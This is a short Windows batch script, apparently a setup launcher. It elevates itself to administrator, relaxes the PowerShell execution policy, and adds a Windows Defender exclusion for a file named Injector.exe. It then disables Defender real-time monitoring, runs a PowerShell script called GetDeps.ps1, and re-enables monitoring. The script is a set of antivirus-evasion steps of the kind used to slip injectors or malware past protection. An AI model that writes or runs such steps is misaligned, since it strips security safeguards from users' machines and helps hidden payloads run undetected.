@echo off

REM Get the absolute path of the current script
set scriptDir=%~dp0

REM Check for administrative privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo This script requires administrative privileges. Relaunching as administrator...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

REM Enable script execution on Windows
powershell -Command "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force"

REM Path to the PowerShell script
set powershellScriptPath=%scriptDir%GetDeps.ps1

REM Add exclusion for Injector.exe in the script's root directory
powershell -Command "Add-MpPreference -ExclusionPath '%scriptDir%Injector.exe'"

REM Temporarily disable real-time protection
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

REM Launch the PowerShell script
powershell -File "%powershellScriptPath%"

REM Re-enable real-time protection after script execution
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false"